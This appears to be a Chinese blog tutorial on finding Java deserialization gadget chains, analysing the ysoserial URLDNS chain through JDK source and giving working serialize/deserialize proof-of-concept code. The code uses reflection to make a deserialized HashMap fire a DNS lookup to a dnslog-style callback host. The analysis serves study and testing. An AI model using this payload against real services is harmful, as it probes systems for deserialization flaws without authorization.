<p>调用链就是将<strong>执行类的风险方法</strong>与<strong>入口类的readObject方法中调用的方法</strong>关联或者说联系在一起的一个或多个类的方法，与<strong>执行类的风险方法</strong>相连接的链，必须是同类型或者说类型宽泛，方法名相同与否都可以，但是方法内必须调用与<strong>执行类的风险方法同名</strong>，以此类推直至找到与<strong>入口类的readObject方法中调用的方法</strong>同名的方法，调用链才算完成。</p>
<p>这个解释看不懂没关系，后面在如何寻找gadget chain中会作详细解释。</p>
<p>3、<strong>入口类</strong></p>
<p>入口类首先得重写readObject方法，类型越宽泛越好 。例如：HashMap</p>
<h3 id="如何寻找gadget-chain"><a href="#如何寻找gadget-chain" class="headerlink" title="如何寻找gadget chain"></a>如何寻找gadget chain</h3><p>这里结合流程图对寻找gadget chain作详细解释，以第一个链为例，后面的链都是一个道理。</p>
<p><img src="image-20211226231518791.png" alt="image-20211226231518791"></p>
<ol>
<li><p>假设这里有一个命令执行风险类A,其中的a方法存在命令执行风险(这里不探究具体代码,只是理解调用链的链接方式)</p>
</li>
<li><p>现在我们要找它的第一个链，现在有三个选择</p>
<ul>
<li>同类不同名方法调用了a()</li>
<li>不同类同名方法调用了a()</li>
<li>不同类不同名方法调用了a()<ul>
<li>当我们选择<em><strong>同类不同名方法调用了a()<em><strong>时，需要考虑的是参数</strong></em>ghi</strong></em>是否可控。</li>
<li>当我们选择<em><strong>不同类同名方法调用了a()<em><strong>时，需要考虑的是</strong></em>Abc</strong></em>与<em><strong>Ghi</strong></em>是否是同类型，<em><strong>x2</strong></em>可否控制。</li>
<li>当我们选择<em><strong>不同类不同名方法调用了a()<em><strong>，需要考虑的是</strong></em>Def</strong></em>与<em><strong>Ghi</strong></em>是否是同类型，<em><strong>x1</strong></em>可否控制。</li>
</ul>
</li>
</ul>
</li>
<li><p>往后的链都是一个道理，直至找到与<strong>入口类的readObject方法中，调用的方法</strong>同名的方法。</p>
<p>比如：HashMap.readObject()中调用了hash()，那么我们的链找到hash()方法就可以，当然具体能不能用还是要看参数是否可控。</p>
</li>
</ol>
<h3 id="URLDNS-Gadget-Chain"><a href="#URLDNS-Gadget-Chain" class="headerlink" title="URLDNS Gadget Chain"></a>URLDNS Gadget Chain</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ysoserial Gadget Chain:</span><br><span class="line">  	HashMap.readObject()<span class="comment">//入口类</span></span><br><span class="line">    	HashMap.putVal()</span><br><span class="line">      		HashMap.hash()</span><br><span class="line">        		URL.hashCode() <span class="comment">//执行类</span></span><br></pre></td></tr></table></figure>

<p>从ysoserial工具的payload来看，执行类是URL的hashCode方法，那我们就跟进去URL类去看看。</p>
<p><em><strong>URL类</strong></em></p>
<p><img src="image-20211226233623759.png" alt="image-20211226233623759"></p>
<p><img src="image-20211226233741972.png" alt="image-20211226233741972"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">private</span> <span class="keyword">int</span> hashCode = -<span class="number">1</span>;</span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">           <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">       hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">       <span class="keyword">return</span> hashCode;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>hashCode默认等于-1，那么就会调用handler.hashCode(this);</p>
<p><img src="image-20211226234313139.png" alt="image-20211226234313139"></p>
<p>跟进到handler.hashCode();</p>
<p>调用handler.hashCode();传入一个URL对象，会调用getHostAddress方法，根据注释Get the IP address of our host.获取主机ip地址，会向host发送请求。<img src="image-20211226234732673.png" alt="image-20211226234732673"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the IP address of our host. An empty host field or a DNS failure</span></span><br><span class="line"><span class="comment">     * will result in a null return.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> u a URL object</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> an &#123;<span class="doctag">@code</span> InetAddress&#125; representing the host</span></span><br><span class="line"><span class="comment">     * IP address.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span> 1.3</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (u.hostAddress != <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> u.hostAddress;</span><br><span class="line"></span><br><span class="line">        String host = u.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host == <span class="keyword">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                u.hostAddress = InetAddress.getByName(host);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnknownHostException ex) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SecurityException se) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>好的，现在执行类已经有了，URL.hashCode()。下面开始找调用链，直接搜索hashCode。</p>
<p><img src="image-20211227000438766.png" alt="image-20211227000438766"></p>
<p>嗯。漂亮，1291处这里就不一个一个看了，我们就直接来看payload的Gadget Chain。HashMap.hash()</p>
<p><img src="image-20211227000837666.png" alt="image-20211227000837666"></p>
<p>这里不就是上面所说的，不同类不同名方法调用了hashCode()，我们只需要看是否是同类型，参数是否可控。这里一个类型Object，一个URL，万物皆Object，符合。但是key并不清楚能否控制，接着往下找。</p>
<p>接下来找那些类调用了hash()，不多，有24处，可以稍微看一下。</p>
<p><img src="image-20211227001518142.png" alt="image-20211227001518142"></p>
<p>直接找到了入口类 HashMap.readObject()，</p>
<p><img src="image-20211227001635501.png" alt="image-20211227001635501"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Reconstitutes this map from a stream (that is, deserializes it).</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> s the stream</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ClassNotFoundException if the class of a serialized object</span></span><br><span class="line"><span class="comment"> *         could not be found</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException if an I/O error occurs</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="keyword">int</span> mappings = s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                         mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">        <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">        <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">        <span class="keyword">float</span> lf = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">        <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((<span class="keyword">int</span>)fc));</span><br><span class="line">        <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">        <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">        SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);<span class="comment">//调用hash(key)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在最后的for循环中调用了hash()，传递了参数key，而key就是将集合的泛型K反序列化后的对象，HashMap的泛型K,V都是可以控制。那么我们来捋一下Gadget Chain。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain：</span><br><span class="line">	HashMap.readObject()&#123;</span><br><span class="line">    	hash(key)</span><br><span class="line">	&#125;</span><br><span class="line">    	HashMap.hash(Object,key)&#123;</span><br><span class="line">            key.hashCode()</span><br><span class="line">        &#125;</span><br><span class="line">    		URL.hashCode()&#123;</span><br><span class="line">            	<span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">            		<span class="keyword">return</span> hashCode;</span><br><span class="line">        		hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">        		<span class="keyword">return</span> hashCode;</span><br><span class="line">            &#125;</span><br><span class="line">				hashCode(URL u) &#123;</span><br><span class="line">                    getHostAddress(u);</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<p>ysoserial工具的payload中多走了一步HashMap.putVal()，从Gadget Chain中可以看出我们只需要将HashMap.hash(Object,key)方法中的key传递一个URL对象，就会调用URL.hashCode()，hashCode=-1就会调用handler.hashCode(this)，就顺利调用getHostAddress(u)。</p>
<p>那么我们便可以构造代码验证一下</p>
<p><em><strong>序列化HashMap对象</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class Serialize &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException&#123;</span><br><span class="line">        URL url = new URL(&quot;http://7d144017.dns.1433.eu.org&quot;);</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap = new HashMap&lt;&gt;();  //HashMap&lt;K, V&gt;,K为URL对象，V随意</span><br><span class="line">        hashmap.put(url,1);</span><br><span class="line">        ObjectOutputStream oo = new ObjectOutputStream(new FileOutputStream(new File(&quot;HashMap.txt&quot;)));</span><br><span class="line">        oo.writeObject(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><em><strong>反序列化HashMap对象</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line">public class UnSerialize &#123;</span><br><span class="line">    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File(&quot;HashMap.txt&quot;)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这时出现了问题，在序列化的时候接收到了请求但是反序列化确没有接收到请求。</p>
<p><img src="image-20211227175414397.png" alt="image-20211227175414397"></p>
<p>经过调试发现，序列化时会发生请求是因为put方法里面也调用了hash()，触发了URL.hashCode，而反序列化时不会发生请求是因为调用到URL.hashCode时，hashCode的值不等于-1，所以进入不到，handler.hashCode(this)，那我们只需要想办法当它序列化时值改为不等于-1的值，调用完put后把他的值改成-1就可以，那要怎么才能改变hashCode的值呢，这里就需要用到<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1g84y1F7df?spm_id_from=333.999.0.0">Java反射</a>。</p>
<p><img src="image-20211227181530286.png" alt="image-20211227181530286"></p>
<p>改进后的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class Serialize &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        URL url = new URL(&quot;http://e5e3bb79.dns.1433.eu.org&quot;);</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap = new HashMap&lt;&gt;();  //HashMap&lt;K, V&gt;,K为URL对象，V随意</span><br><span class="line">        Class c = url.getClass();</span><br><span class="line">        Field hashCode = c.getDeclaredField(&quot;hashCode&quot;);</span><br><span class="line">        hashCode.setAccessible(true);</span><br><span class="line">        hashCode.set(url,-2);//在put前将hashCode的值设置为-2</span><br><span class="line">        hashmap.put(url,1);</span><br><span class="line">        hashCode.set(url,-1);//之后再设置回-1</span><br><span class="line">        ObjectOutputStream oo = new ObjectOutputStream(new FileOutputStream(new File(&quot;HashMap.txt&quot;)));</span><br><span class="line">        oo.writeObject(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再次尝试，序列化时没有发生请求。</p>
<p><img src="image-20211227183531894.png" alt="image-20211227183531894"></p>
<p>反序列化发送了请求</p>
<p><img src="image-20211227185736427.png" alt="image-20211227185736427"></p>
<p>至此URLDNS分析完毕。</p>

            


        </div>
    </div>
    <div id="post-footer" class="post-footer main-content-wrap">
        
            <div class="post-footer-tags">
                <span class="text-color-light text-small">标签</span><br/>
                
    <a class="tag tag--primary tag--small t-none-link" href="/tags/java/" rel="tag">java</a> <a class="tag tag--primary tag--small t-none-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>

            </div>
        
        
            <div class="post-actions-wrap">
    <nav>
        <ul class="post-actions post-action-nav">
            <li class="post-action">
                
                    <a
                        class="post-action-btn btn btn--disabled"
                        aria-hidden="true"
                    >
                        
                        <i class="fa fa-angle-left" aria-hidden="true"></i>
                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
                    </a>
            </li>
            <li class="post-action">
                
                    <a
                        class="post-action-btn btn btn--disabled"
                        aria-hidden="true"
                    >
                        
                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
                        <i class="fa fa-angle-right" aria-hidden="true"></i>
                    </a>
            </li>
        </ul>
    </nav>
    <ul class="post-actions post-action-share">
        <li class="post-action hide-lg hide-md hide-sm">
            <a
                class="post-action-btn btn btn--default btn-open-shareoptions"
                href="#btn-open-shareoptions"
                aria-label="Diesen Beitrag teilen"
            >
                <i class="fa fa-share-alt" aria-hidden="true"></i>
            </a>
        </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://self209.github.io/2021/12/26/20211226/"
                    title="分享到 Facebook"
                    aria-label="分享到 Facebook"
                >
                    <i class="fab fa-facebook" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://twitter.com/intent/tweet?text=https://self209.github.io/2021/12/26/20211226/"
                    title="分享到 Twitter"
                    aria-label="分享到 Twitter"
                >
                    <i class="fab fa-twitter" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://plus.google.com/share?url=https://self209.github.io/2021/12/26/20211226/"
                    title="分享到 Google+"
                    aria-label="分享到 Google+"
                >
                    <i class="fab fa-google-plus" aria-hidden="true"></i>
                </a>
            </li>
        
        
            
        
        <li class="post-action">
            
                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="目录">
            
                <i class="fa fa-list" aria-hidden="true"></i>
            </a>
        </li>
    </ul>
</div>


        
        
            
        
    </div>
</article>



                <footer id="footer" class="main-content-wrap">
    <span class="copyrights">
        Copyrights &copy; 2021 self_209. All Rights Reserved.
    </span>
</footer>

            </div>
            
                <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
                    <div class="post-actions-wrap">
    <nav>
        <ul class="post-actions post-action-nav">
            <li class="post-action">
                
                    <a
                        class="post-action-btn btn btn--disabled"
                        aria-hidden="true"
                    >
                        
                        <i class="fa fa-angle-left" aria-hidden="true"></i>
                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
                    </a>
            </li>
            <li class="post-action">
                
                    <a
                        class="post-action-btn btn btn--disabled"
                        aria-hidden="true"
                    >
                        
                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
                        <i class="fa fa-angle-right" aria-hidden="true"></i>
                    </a>
            </li>
        </ul>
    </nav>
    <ul class="post-actions post-action-share">
        <li class="post-action hide-lg hide-md hide-sm">
            <a
                class="post-action-btn btn btn--default btn-open-shareoptions"
                href="#btn-open-shareoptions"
                aria-label="Diesen Beitrag teilen"
            >
                <i class="fa fa-share-alt" aria-hidden="true"></i>
            </a>
        </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://self209.github.io/2021/12/26/20211226/"
                    title="分享到 Facebook"
                    aria-label="分享到 Facebook"
                >
                    <i class="fab fa-facebook" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://twitter.com/intent/tweet?text=https://self209.github.io/2021/12/26/20211226/"
                    title="分享到 Twitter"
                    aria-label="分享到 Twitter"
                >
                    <i class="fab fa-twitter" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://plus.google.com/share?url=https://self209.github.io/2021/12/26/20211226/"
                    title="分享到 Google+"
                    aria-label="分享到 Google+"
                >
                    <i class="fab fa-google-plus" aria-hidden="true"></i>
                </a>
            </li>
        
        
            
        
        <li class="post-action">
            
                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="目录">
            
                <i class="fa fa-list" aria-hidden="true"></i>
            </a>
        </li>
    </ul>
</div>


                </div>
                
    <div id="share-options-bar" class="share-options-bar" data-behavior="5">
        <i id="btn-close-shareoptions" class="fa fa-times"></i>
        <ul class="share-options">
            
                
                
                <li class="share-option">
                    <a
                        class="share-option-btn"
                        target="new"
                        href="https://www.facebook.com/sharer/sharer.php?u=https://self209.github.io/2021/12/26/20211226/"
                        aria-label="分享到 Facebook"
                    >
                        <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
                    </a>
                </li>
            
                
                
                <li class="share-option">
                    <a
                        class="share-option-btn"
                        target="new"
                        href="https://twitter.com/intent/tweet?text=https://self209.github.io/2021/12/26/20211226/"
                        aria-label="分享到 Twitter"
                    >
                        <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
                    </a>
                </li>
            
                
                
                <li class="share-option">
                    <a
                        class="share-option-btn"
                        target="new"
                        href="https://plus.google.com/share?url=https://self209.github.io/2021/12/26/20211226/"
                        aria-label="分享到 Google+"
                    >
                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
                    </a>
                </li>
            
        </ul>
    </div>


            
        </div>
        


<div id="about">
    <div id="about-card">
        <div id="about-btn-close">
            <i class="fa fa-times"></i>
        </div>
        
            <h4 id="about-card-name">self_209</h4>
        
            <div id="about-card-bio"><p>author.bio</p>
</div>
        
        
            <div id="about-card-job">
                <i class="fa fa-briefcase"></i>
                <br/>
                <p>author.job</p>

            </div>
        
        
    </div>
</div>

        
        
<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
        <!--SCRIPTS-->

<script src="/assets/js/script-xim376viwh5lr12gw0yeibdthi5jv6dbtso7hirh0xa2nvwxpntwvib0dgwh.min.js"></script>

<!--SCRIPTS END-->


    




    </body>
</html>
